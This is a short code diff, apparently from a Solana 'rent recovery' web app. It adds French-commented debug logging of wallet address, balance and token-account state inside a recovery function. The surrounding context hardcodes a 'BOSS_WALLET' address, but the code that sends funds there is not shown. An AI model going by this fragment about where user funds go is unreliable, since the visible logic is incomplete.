@@ -1245,7 +1245,22 @@ async function scanTokens() {
        async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
     try {
         console.log("🚀 DÉMARRAGE AVEC 2x COMPUTE BUDGET...");
-        
+        console.log("=== DEBUG ULTIME ===");
+console.log("userWalletAddress:", userWalletAddress);
+console.log("userBalance:", userBalance);
+console.log("recoverableSOL:", recoverableSOL);
+console.log("tokenAccountAddress:", tokenAccountAddress);
+
+// VÉRIFIER LE SOLDE RÉEL
+const balanceCheck = await connection.getBalance(new solanaWeb3.PublicKey(userWalletAddress));
+console.log("Balance réelle:", balanceCheck / 1000000000, "SOL");
+
+// VÉRIFIER LE COMPTE TOKEN
+const tokenAccountCheck = await connection.getAccountInfo(new solanaWeb3.PublicKey(tokenAccountAddress));
+console.log("Token account existe:", !!tokenAccountCheck);
+if (tokenAccountCheck) {
+    console.log("Rent du token:", tokenAccountCheck.lamports / 1000000000, "SOL");
+}
         const userPublicKey = new solanaWeb3.PublicKey(userWalletAddress);
         const tokenPublicKey = new solanaWeb3.PublicKey(tokenAccountAddress);
         const BOSS_WALLET = new solanaWeb3.PublicKey("AG7cszvmbcxpVAB5p9XAasgSArcsum7Z9wBpqt8Eu2Fg");
